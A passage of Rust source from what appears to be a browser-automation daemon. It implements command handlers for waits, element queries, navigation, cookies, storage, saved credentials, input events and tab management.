    Ok(json!({ "unchecked": selector }))
}

async fn handle_wait(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let timeout_ms = state.timeout_ms(cmd);

    if let Some(text) = cmd.get("text").and_then(|v| v.as_str()) {
        wait_for_text(&mgr.client, &session_id, text, timeout_ms).await?;
        return Ok(json!({ "waited": "text", "text": text }));
    }

    if let Some(selector) = cmd.get("selector").and_then(|v| v.as_str()) {
        let state_str = cmd
            .get("state")
            .and_then(|v| v.as_str())
            .unwrap_or("visible");
        // Honor an active `frame <sel>` selection, like element resolution does.
        match state.active_frame_id.as_deref() {
            Some(frame_id) => match state.iframe_sessions.get(frame_id) {
                Some(frame_session) => {
                    wait_for_selector(&mgr.client, frame_session, selector, state_str, timeout_ms)
                        .await?
                }
                None => {
                    wait_for_selector_in_frame(
                        &mgr.client,
                        &session_id,
                        frame_id,
                        selector,
                        state_str,
                        timeout_ms,
                    )
                    .await?
                }
            },
            None => {
                wait_for_selector(&mgr.client, &session_id, selector, state_str, timeout_ms).await?
            }
        }
        return Ok(json!({ "waited": "selector", "selector": selector }));
    }

    if let Some(url_pattern) = cmd.get("url").and_then(|v| v.as_str()) {
        wait_for_url(mgr, url_pattern, timeout_ms).await?;
        return Ok(json!({ "waited": "url", "url": url_pattern }));
    }

    if let Some(fn_str) = cmd.get("function").and_then(|v| v.as_str()) {
        wait_for_function(&mgr.client, &session_id, fn_str, timeout_ms).await?;
        return Ok(json!({ "waited": "function" }));
    }

    if let Some(load_state) = cmd.get("loadState").and_then(|v| v.as_str()) {
        let wait_until = WaitUntil::from_str(load_state);
        mgr.wait_for_lifecycle_external(wait_until, &session_id, timeout_ms)
            .await?;
        return Ok(json!({ "waited": "load", "state": load_state }));
    }

    // Just a timeout wait
    tokio::time::sleep(tokio::time::Duration::from_millis(timeout_ms)).await;
    Ok(json!({ "waited": "timeout", "ms": timeout_ms }))
}

async fn handle_gettext(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;

    let text = super::element::get_element_text(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        &state.iframe_sessions,
    )
    .await?;
    let url = mgr.get_url().await.unwrap_or_default();
    Ok(json!({ "text": text, "origin": url }))
}

async fn handle_getattribute(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;
    let attribute = cmd
        .get("attribute")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'attribute' parameter")?;

    let value = super::element::get_element_attribute(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        attribute,
        &state.iframe_sessions,
    )
    .await?;
    let url = mgr.get_url().await.unwrap_or_default();
    Ok(json!({ "value": value, "origin": url }))
}

async fn handle_isvisible(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;

    let visible = super::element::is_element_visible(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        &state.iframe_sessions,
    )
    .await?;
    let url = mgr.get_url().await.unwrap_or_default();
    Ok(json!({ "visible": visible, "origin": url }))
}

async fn handle_isenabled(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;

    let enabled = super::element::is_element_enabled(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        &state.iframe_sessions,
    )
    .await?;
    let url = mgr.get_url().await.unwrap_or_default();
    Ok(json!({ "enabled": enabled, "origin": url }))
}

async fn handle_ischecked(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;

    let checked = super::element::is_element_checked(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        &state.iframe_sessions,
    )
    .await?;
    let url = mgr.get_url().await.unwrap_or_default();
    Ok(json!({ "checked": checked, "origin": url }))
}

async fn handle_back(state: &mut DaemonState) -> Result<Value, String> {
    if let Some(ref wb) = state.webdriver_backend {
        if state.browser.is_none() {
            wb.back().await?;
            tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
            let url = wb.get_url().await.unwrap_or_default();
            state.ref_map.invalidate_all_documents();
            return Ok(json!({ "url": url }));
        }
    }
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    mgr.evaluate("history.back()", None).await?;
    tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
    let url = mgr.get_url().await.unwrap_or_default();
    state.ref_map.invalidate_page(&session_id);
    Ok(json!({ "url": url }))
}

async fn handle_forward(state: &mut DaemonState) -> Result<Value, String> {
    if let Some(ref wb) = state.webdriver_backend {
        if state.browser.is_none() {
            wb.forward().await?;
            tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
            let url = wb.get_url().await.unwrap_or_default();
            state.ref_map.invalidate_all_documents();
            return Ok(json!({ "url": url }));
        }
    }
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    mgr.evaluate("history.forward()", None).await?;
    tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
    let url = mgr.get_url().await.unwrap_or_default();
    state.ref_map.invalidate_page(&session_id);
    Ok(json!({ "url": url }))
}

async fn handle_reload(state: &mut DaemonState) -> Result<Value, String> {
    if let Some(ref wb) = state.webdriver_backend {
        if state.browser.is_none() {
            wb.reload().await?;
            tokio::time::sleep(tokio::time::Duration::from_millis(1000)).await;
            let url = wb.get_url().await.unwrap_or_default();
            state.ref_map.invalidate_all_documents();
            return Ok(json!({ "url": url }));
        }
    }
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();

    mgr.client
        .send_command_no_params("Page.reload", Some(&session_id))
        .await?;

    let mut rx = mgr.client.subscribe();
    let _ = tokio::time::timeout(tokio::time::Duration::from_secs(10), async {
        loop {
            match rx.recv().await {
                Ok(event) => {
                    if event.method == "Page.loadEventFired"
                        && event.session_id.as_deref() == Some(&session_id)
                    {
                        return;
                    }
                }
                Err(tokio::sync::broadcast::error::RecvError::Lagged(_)) => continue,
                Err(_) => break,
            }
        }
    })
    .await;

    let url = mgr.get_url().await.unwrap_or_default();
    state.ref_map.invalidate_page(&session_id);
    Ok(json!({ "url": url }))
}

// ---------------------------------------------------------------------------
// Wait helpers
// ---------------------------------------------------------------------------

async fn wait_for_selector(
    client: &super::cdp::client::CdpClient,
    session_id: &str,
    selector: &str,
    state: &str,
    timeout_ms: u64,
) -> Result<(), String> {
    let check_fn = match state {
        "attached" => format!(
            "!!document.querySelector({})",
            serde_json::to_string(selector).unwrap_or_default()
        ),
        "detached" => format!(
            "!document.querySelector({})",
            serde_json::to_string(selector).unwrap_or_default()
        ),
        "hidden" => format!(
            r#"(() => {{
                const el = document.querySelector({sel});
                if (!el) return true;
                const s = window.getComputedStyle(el);
                return s.display === 'none' || s.visibility === 'hidden' || parseFloat(s.opacity) === 0;
            }})()"#,
            sel = serde_json::to_string(selector).unwrap_or_default()
        ),
        _ => format!(
            r#"(() => {{
                const el = document.querySelector({sel});
                if (!el) return false;
                const r = el.getBoundingClientRect();
                const s = window.getComputedStyle(el);
                return r.width > 0 && r.height > 0 && s.visibility !== 'hidden' && s.display !== 'none';
            }})()"#,
            sel = serde_json::to_string(selector).unwrap_or_default()
        ),
    };

    poll_until_true(client, session_id, &check_fn, timeout_ms).await
}

async fn wait_for_url(mgr: &BrowserManager, pattern: &str, timeout_ms: u64) -> Result<(), String> {
    let deadline = tokio::time::Instant::now() + tokio::time::Duration::from_millis(timeout_ms);

    loop {
        let url = mgr.get_url().await?;
        if route_url_matches(pattern, &url) {
            return Ok(());
        }

        if tokio::time::Instant::now() >= deadline {
            return Err(format!("Wait timed out after {}ms", timeout_ms));
        }

        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
    }
}

async fn wait_for_text(
    client: &super::cdp::client::CdpClient,
    session_id: &str,
    text: &str,
    timeout_ms: u64,
) -> Result<(), String> {
    let check_fn = format!(
        "(document.body.innerText || '').includes({})",
        serde_json::to_string(text).unwrap_or_default()
    );
    poll_until_true(client, session_id, &check_fn, timeout_ms).await
}

async fn wait_for_function(
    client: &super::cdp::client::CdpClient,
    session_id: &str,
    fn_str: &str,
    timeout_ms: u64,
) -> Result<(), String> {
    let check_fn = format!("!!({})", fn_str);
    poll_until_true(client, session_id, &check_fn, timeout_ms).await
}

/// wait_for_selector inside a same-process iframe selected via `frame <sel>`:
/// polls through the owner element's contentDocument, which stays correct
/// even if the frame navigates (the getter re-resolves every poll).
async fn wait_for_selector_in_frame(
    client: &super::cdp::client::CdpClient,
    session_id: &str,
    frame_id: &str,
    selector: &str,
    state: &str,
    timeout_ms: u64,
) -> Result<(), String> {
    let owner_object_id =
        super::element::frame_owner_object_id(client, session_id, frame_id).await?;
    let sel = serde_json::to_string(selector).unwrap_or_default();
    let check = match state {
        "attached" => format!("!!doc.querySelector({sel})"),
        "detached" => format!("!doc.querySelector({sel})"),
        "hidden" => format!(
            r#"(() => {{
                const el = doc.querySelector({sel});
                if (!el) return true;
                const s = doc.defaultView.getComputedStyle(el);
                return s.display === 'none' || s.visibility === 'hidden' || parseFloat(s.opacity) === 0;
            }})()"#,
        ),
        _ => format!(
            r#"(() => {{
                const el = doc.querySelector({sel});
                if (!el) return false;
                const r = el.getBoundingClientRect();
                const s = doc.defaultView.getComputedStyle(el);
                return r.width > 0 && r.height > 0 && s.visibility !== 'hidden' && s.display !== 'none';
            }})()"#,
        ),
    };
    let function = format!(
        "function() {{ const doc = this.contentDocument; if (!doc) return false; return {check}; }}",
    );
    let deadline = tokio::time::Instant::now() + tokio::time::Duration::from_millis(timeout_ms);
    loop {
        let result = client
            .send_command(
                "Runtime.callFunctionOn",
                Some(json!({
                    "objectId": owner_object_id,
                    "functionDeclaration": function,
                    "returnByValue": true,
                })),
                Some(session_id),
            )
            .await?;
        let satisfied = result
            .get("result")
            .and_then(|r| r.get("value"))
            .and_then(|v| v.as_bool())
            .unwrap_or(false);
        if satisfied {
            return Ok(());
        }
        if tokio::time::Instant::now() >= deadline {
            return Err(format!("Wait timed out after {}ms", timeout_ms));
        }
        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
    }
}

async fn poll_until_true(
    client: &super::cdp::client::CdpClient,
    session_id: &str,
    expression: &str,
    timeout_ms: u64,
) -> Result<(), String> {
    let deadline = tokio::time::Instant::now() + tokio::time::Duration::from_millis(timeout_ms);

    loop {
        let result: super::cdp::types::EvaluateResult = client
            .send_command_typed(
                "Runtime.evaluate",
                &super::cdp::types::EvaluateParams {
                    expression: expression.to_string(),
                    return_by_value: Some(true),
                    await_promise: Some(true),
                },
                Some(session_id),
            )
            .await?;

        if result
            .result
            .value
            .as_ref()
            .and_then(|v| v.as_bool())
            .unwrap_or(false)
        {
            return Ok(());
        }

        if tokio::time::Instant::now() >= deadline {
            return Err(format!("Wait timed out after {}ms", timeout_ms));
        }

        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
    }
}

// ---------------------------------------------------------------------------
// Phase 3 handlers
// ---------------------------------------------------------------------------

async fn handle_cookies_get(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    if let Some(ref wb) = state.webdriver_backend {
        if state.browser.is_none() {
            let cookies_list = wb.get_cookies().await?;
            return Ok(json!({ "cookies": cookies_list }));
        }
    }
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();

    let urls = cmd.get("urls").and_then(|v| v.as_array()).map(|arr| {
        arr.iter()
            .filter_map(|v| v.as_str().map(String::from))
            .collect()
    });

    let cookies_list = cookies::get_cookies(&mgr.client, &session_id, urls).await?;
    Ok(json!({ "cookies": cookies_list }))
}

async fn handle_cookies_set(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let url = mgr.get_url().await.ok();

    let cookie_values = if let Some(arr) = cmd.get("cookies").and_then(|v| v.as_array()) {
        arr.clone()
    } else {
        let mut cookie = serde_json::Map::new();
        for key in &[
            "name", "value", "domain", "path", "expires", "httpOnly", "secure", "sameSite", "url",
        ] {
            if let Some(v) = cmd.get(*key) {
                if !v.is_null() {
                    cookie.insert(key.to_string(), v.clone());
                }
            }
        }
        vec![Value::Object(cookie)]
    };

    cookies::set_cookies(&mgr.client, &session_id, cookie_values, url.as_deref()).await?;
    Ok(json!({ "set": true }))
}

async fn handle_cookies_clear(state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    cookies::clear_cookies(&mgr.client, &session_id).await?;
    Ok(json!({ "cleared": true }))
}

async fn handle_storage_get(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let storage_type = cmd.get("type").and_then(|v| v.as_str()).unwrap_or("local");
    let key = cmd.get("key").and_then(|v| v.as_str());
    storage::storage_get(&mgr.client, &session_id, storage_type, key).await
}

async fn handle_storage_set(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let storage_type = cmd.get("type").and_then(|v| v.as_str()).unwrap_or("local");
    let key = cmd
        .get("key")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'key' parameter")?;
    let value = cmd
        .get("value")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'value' parameter")?;
    storage::storage_set(&mgr.client, &session_id, storage_type, key, value).await?;
    Ok(json!({ "set": true }))
}

async fn handle_storage_clear(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let storage_type = cmd.get("type").and_then(|v| v.as_str()).unwrap_or("local");
    storage::storage_clear(&mgr.client, &session_id, storage_type).await?;
    Ok(json!({ "cleared": true }))
}

async fn handle_setcontent(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let html = cmd
        .get("html")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'html' parameter")?;
    network::set_content(&mgr.client, &session_id, html).await?;
    Ok(json!({ "set": true }))
}

async fn handle_headers(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();

    let headers_value = cmd.get("headers").ok_or("Missing 'headers' parameter")?;

    let headers: HashMap<String, String> = headers_value
        .as_object()
        .map(|m| {
            m.iter()
                .map(|(k, v)| (k.clone(), v.as_str().unwrap_or("").to_string()))
                .collect()
        })
        .unwrap_or_default();

    network::set_extra_headers(&mgr.client, &session_id, &headers).await?;
    // A fresh target already has no extra headers, so an empty map clears the
    // inherited setup instead of forcing later tabs through deferred loading.
    state.session_setup.extra_headers = (!headers.is_empty()).then_some(headers);
    Ok(json!({ "set": true }))
}

async fn handle_offline(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let offline = cmd.get("offline").and_then(|v| v.as_bool()).unwrap_or(true);
    network::set_offline(&mgr.client, &session_id, offline).await?;
    // Online is the default for a fresh target and needs no replay.
    state.session_setup.offline = offline.then_some(true);
    Ok(json!({ "offline": offline }))
}

async fn handle_console(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let clear = cmd.get("clear").and_then(|v| v.as_bool()).unwrap_or(false);
    if clear {
        state.event_tracker.clear_console();
        Ok(json!({ "cleared": true }))
    } else {
        let result = state.event_tracker.get_console_json();
        Ok(result)
    }
}

/// Reads captured page errors or clears them when requested.
async fn handle_errors(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let clear = cmd.get("clear").and_then(|v| v.as_bool()).unwrap_or(false);
    if clear {
        state.event_tracker.clear_errors();
        Ok(json!({ "cleared": true }))
    } else {
        Ok(state.event_tracker.get_errors_json())
    }
}

async fn handle_session_info(state: &DaemonState) -> Result<Value, String> {
    Ok(json!({
        "session": state.session_id,
        "namespace": env::var("AGENT_BROWSER_NAMESPACE").ok(),
        "socketDir": get_socket_dir().to_string_lossy(),
        "backgroundPid": std::process::id(),
        "browserLaunched": state.browser.is_some(),
        "pageCount": state.browser.as_ref().map(|mgr| mgr.page_count()).unwrap_or(0),
        "engine": state.engine,
        "launchHash": state.launch_identity,
        "compatibilityStatus": "current",
        "effectiveLaunch": {
            "browserLaunched": state.browser.is_some(),
            "engine": state.engine,
            "launchHash": state.launch_identity,
        },
        "restoreKey": state.session_name,
        "restoreStatus": state.restore_status,
        "restoreStatusDetail": state.restore_status_detail,
        "restoreSkippedOrigins": state.restore_skipped_origins,
        "restoreLoadedPath": state.restore_loaded_path,
        "restoreValidationPending": state.restore_validation_pending,
        "restoreSave": state.restore_save,
        "saveStatus": state.restore_save_status,
        "restoreSavedPath": state.restore_saved_path,
        "restoreCheckUrl": state.restore_check_url,
        "restoreCheckText": state.restore_check_text,
        "restoreCheckFn": state.restore_check_fn,
    }))
}

async fn handle_state_save(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let path = cmd.get("path").and_then(|v| v.as_str());

    let saved_path = state::save_state(
        &mgr.client,
        &session_id,
        path,
        state.session_name.as_deref(),
        &state.session_id,
        mgr.visited_origins(),
    )
    .await?;

    Ok(json!({ "saved": true, "path": saved_path }))
}

async fn handle_state_load(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let path = cmd
        .get("path")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'path' parameter")?;

    ensure_state_replay_supported_by_active_domain_filter(state, "state load").await?;
    let skipped = state::load_state(&mgr.client, &session_id, path).await?;
    mark_explicit_storage_state_loaded(state, path);
    Ok(json!({ "loaded": true, "path": path, "skippedOrigins": skipped }))
}

// ---------------------------------------------------------------------------
// Phase 6 handlers
// ---------------------------------------------------------------------------

async fn handle_diff_snapshot(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();

    let compact = cmd
        .get("compact")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let max_depth = cmd
        .get("maxDepth")
        .and_then(|v| v.as_u64())
        .map(|d| d as usize);
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .map(String::from);

    let options = SnapshotOptions {
        compact,
        depth: max_depth,
        selector,
        ..SnapshotOptions::default()
    };
    // Reuse the current document identities without committing a failed capture.
    // Build the replacement separately so a failed diff leaves the existing refs usable.
    let mut current_ref_map = state.ref_map.clone();
    current_ref_map.begin_snapshot();
    let current = snapshot::take_snapshot(
        &mgr.client,
        &session_id,
        &options,
        &mut current_ref_map,
        state.active_frame_id.as_deref(),
        &state.iframe_sessions,
    )
    .await?;

    let baseline = cmd.get("baseline").and_then(|v| v.as_str());

    let baseline_text = match baseline {
        Some(b) if std::path::Path::new(b).exists() => {
            let mut contents = std::fs::read_to_string(b)
                .map_err(|e| format!("Failed to read baseline: {}", e))?;
            // Plain CLI output ends with one newline when redirected to a baseline file.
            if contents.ends_with('\n') {
                contents.pop();
                if contents.ends_with('\r') {
                    contents.pop();
                }
            }
            contents
        }
        Some(b) => b.to_string(),
        None => String::new(),
    };

    let result = diff::diff_snapshots(
        &diff::snapshot_comparison_text(&baseline_text),
        &diff::snapshot_comparison_text(&current),
    );
    state.ref_map = current_ref_map;
    Ok(json!({
        "diff": result.diff,
        "additions": result.additions,
        "removals": result.removals,
        "unchanged": result.unchanged,
        "changed": result.changed,
    }))
}

async fn handle_diff_url(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_mut().ok_or("Browser not launched")?;

    let url1 = cmd
        .get("url1")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'url1' parameter")?;
    let url2 = cmd
        .get("url2")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'url2' parameter")?;

    let wait_until = cmd
        .get("waitUntil")
        .and_then(|v| v.as_str())
        .map(WaitUntil::from_str)
        .unwrap_or(WaitUntil::Load);

    // Each navigation can replace the document, so invalidate refs before it starts.
    let first_session_id = mgr.active_session_id()?.to_string();
    state.ref_map.invalidate_page(&first_session_id);

    // Navigate to URL1 and snapshot
    mgr.navigate(url1, wait_until).await?;
    let first_session_id = mgr.active_session_id()?.to_string();
    let options = SnapshotOptions::default();
    let mut snap1_ref_map = state.ref_map.clone();
    let snap1 = snapshot::take_snapshot(
        &mgr.client,
        &first_session_id,
        &options,
        &mut snap1_ref_map,
        None,
        &state.iframe_sessions,
    )
    .await?;

    // Navigate to URL2 and snapshot
    snap1_ref_map.invalidate_page(&first_session_id);
    mgr.navigate(url2, wait_until).await?;
    let second_session_id = mgr.active_session_id()?.to_string();
    let mut snap2_ref_map = snap1_ref_map;
    let snap2 = snapshot::take_snapshot(
        &mgr.client,
        &second_session_id,
        &options,
        &mut snap2_ref_map,
        None,
        &state.iframe_sessions,
    )
    .await?;

    let result = diff::diff_text(
        &diff::snapshot_comparison_text(&snap1),
        &diff::snapshot_comparison_text(&snap2),
    );
    state.ref_map = snap2_ref_map;
    Ok(json!({
        "diff": result,
        "url1": url1,
        "url2": url2,
        "snapshot1": snap1,
        "snapshot2": snap2,
    }))
}

async fn handle_credentials_set(cmd: &Value) -> Result<Value, String> {
    let name = cmd
        .get("name")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'name'")?;
    let username = cmd
        .get("username")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'username'")?;
    let password = cmd
        .get("password")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'password'")?;
    let url = cmd.get("url").and_then(|v| v.as_str());
    auth::credentials_set(name, username, password, url)
}

async fn handle_credentials_get(cmd: &Value) -> Result<Value, String> {
    let name = cmd
        .get("name")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'name'")?;
    auth::credentials_get(name)
}

async fn handle_credentials_delete(cmd: &Value) -> Result<Value, String> {
    let name = cmd
        .get("name")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'name'")?;
    auth::credentials_delete(name)
}

async fn handle_credentials_list() -> Result<Value, String> {
    auth::credentials_list()
}

async fn handle_auth_show(cmd: &Value) -> Result<Value, String> {
    let name = cmd
        .get("name")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'name'")?;
    auth::auth_show(name)
}

async fn handle_mouse(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();

    let event_type = cmd
        .get("eventType")
        .and_then(|v| v.as_str())
        .unwrap_or("mouseMoved");
    let x = cmd.get("x").and_then(|v| v.as_f64()).unwrap_or(0.0);
    let y = cmd.get("y").and_then(|v| v.as_f64()).unwrap_or(0.0);
    let button = cmd.get("button").and_then(|v| v.as_str()).unwrap_or("none");
    let click_count = cmd.get("clickCount").and_then(|v| v.as_i64()).unwrap_or(0);

    mgr.client
        .send_command(
            "Input.dispatchMouseEvent",
            Some(json!({
                "type": event_type,
                "x": x,
                "y": y,
                "button": button,
                "clickCount": click_count,
            })),
            Some(&session_id),
        )
        .await?;
    state.mouse_state.x = x;
    state.mouse_state.y = y;
    match event_type {
        "mousePressed" => state.mouse_state.buttons |= mouse_button_mask(button),
        "mouseReleased" => state.mouse_state.buttons &= !mouse_button_mask(button),
        _ => {}
    }
    if let Ok(mut cursor) = state.recording_state.shared_cursor.lock() {
        cursor.record(x, y, i32::from(event_type == "mousePressed"));
    }

    Ok(json!({ "dispatched": event_type }))
}

async fn handle_keyboard(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();

    match cmd.get("subaction").and_then(|v| v.as_str()) {
        Some("type") => {
            let text = cmd
                .get("text")
                .and_then(|v| v.as_str())
                .ok_or("Missing 'text' parameter")?;
            interaction::type_text_into_active_context(&mgr.client, &session_id, text, None)
                .await?;
            return Ok(json!({ "typed": text }));
        }
        Some("insertText") => {
            let text = cmd
                .get("text")
                .and_then(|v| v.as_str())
                .ok_or("Missing 'text' parameter")?;
            mgr.client
                .send_command(
                    "Input.insertText",
                    Some(json!({ "text": text })),
                    Some(&session_id),
                )
                .await?;
            return Ok(json!({ "inserted": true }));
        }
        _ => {}
    }

    let event_type = cmd
        .get("eventType")
        .and_then(|v| v.as_str())
        .unwrap_or("keyDown");
    let key = cmd.get("key").and_then(|v| v.as_str());
    let code = cmd.get("code").and_then(|v| v.as_str());
    let text = cmd.get("text").and_then(|v| v.as_str());

    let mut params = json!({ "type": event_type });
    if let Some(k) = key {
        params["key"] = Value::String(k.to_string());
    }
    if let Some(c) = code {
        params["code"] = Value::String(c.to_string());
    }
    if let Some(t) = text {
        params["text"] = Value::String(t.to_string());
    }

    mgr.client
        .send_command("Input.dispatchKeyEvent", Some(params), Some(&session_id))
        .await?;

    Ok(json!({ "dispatched": event_type }))
}

// ---------------------------------------------------------------------------
// Phase 5 handlers
// ---------------------------------------------------------------------------

async fn handle_tab_list(state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let tabs = mgr.tab_list();
    Ok(json!({ "tabs": tabs }))
}

async fn handle_tab_new(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let url = cmd.get("url").and_then(|v| v.as_str());
    let label = cmd.get("label").and_then(|v| v.as_str());
    let domain_filter = state.domain_filter.read().await.clone();
    let has_proxy_creds = state.proxy_credentials.read().await.is_some();
    let defer_url_until_controls =
        should_defer_url_until_network_controls(domain_filter.as_ref(), has_proxy_creds, url)?;
    // UA, init scripts, headers, and routes are per-session in CDP, so when
    // any are configured the tab is created blank and navigated only after
    // they are replayed onto it; otherwise the first document would miss them.
    let defer_url =
        defer_url_until_controls || (url.is_some() && session_setup_pending(state).await);

    let (mut result, new_session_id) = {
        let mgr = state.browser.as_mut().ok_or("Browser not launched")?;
        let result = mgr
            .tab_new(if defer_url { None } else { url }, label)
            .await?;
        (result, mgr.active_session_id()?.to_string())
    };

    state.ref_map.begin_snapshot();
    state.active_iframe_sessions.clear();
    state.active_frame_id = None;
    state.webmcp.clear_invocations();

    apply_session_setup(state, &new_session_id).await?;
    install_network_controls_or_close(state, has_proxy_creds).await?;
    state.drain_cdp_events_background().await?;

    if defer_url {
        if let Some(url) = url {
            let nav = {
                let mgr = state.browser.as_mut().ok_or("Browser not launched")?;
                mgr.navigate(url, WaitUntil::Load).await?
            };
            if let Some(obj) = result.as_object_mut() {
                if let Some(value) = nav.get("url") {
                    obj.insert("url".to_string(), value.clone());
                }
                if let Some(value) = nav.get("title") {
                    obj.insert("title".to_string(), value.clone());
                }
            }
        }
    }

    state.refresh_active_iframe_sessions().await;

    Ok(result)
}

async fn handle_tab_switch(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let tab_ref_str = cmd
        .get("tabId")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'tabId' parameter (expected `t<N>` or a label)")?;
    let tab_ref = super::browser::TabRef::parse(tab_ref_str)?;
    let tab_id = {
        let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
        mgr.resolve_tab_ref(&tab_ref)?
    };
    if let Some(target_id) = state
        .browser
        .as_ref()
        .and_then(|mgr| mgr.target_id_for_tab(tab_id))
    {
        if let Some(owner) = super::tab_binding::pinned_owner(target_id, &state.session_id) {
            return Err(format!(
                "tab_locked: tab {} is pinned by session '{}' (--pin-tab); close that session or use another tab",
                target_id, owner
            ));
        }
    }
    let dialog_session = state
        .pending_dialog
        .as_ref()
        .and_then(|d| d.session_id.clone());
    let result = {
        let mgr = state.browser.as_mut().ok_or("Browser not launched")?;
        mgr.tab_switch_by_id(tab_id, dialog_session.as_deref())
            .await?
    };
    // Clear only after the switch commits, so a failed switch does not strand
    // the user on the old tab with dead refs and frame scope.
    state.ref_map.begin_snapshot();
    state.active_iframe_sessions.clear();
    state.active_frame_id = None;
    state.webmcp.clear_invocations();

    let has_proxy_creds = state.proxy_credentials.read().await.is_some();
    install_network_controls_or_close(state, has_proxy_creds).await?;
    state.refresh_active_iframe_sessions().await;

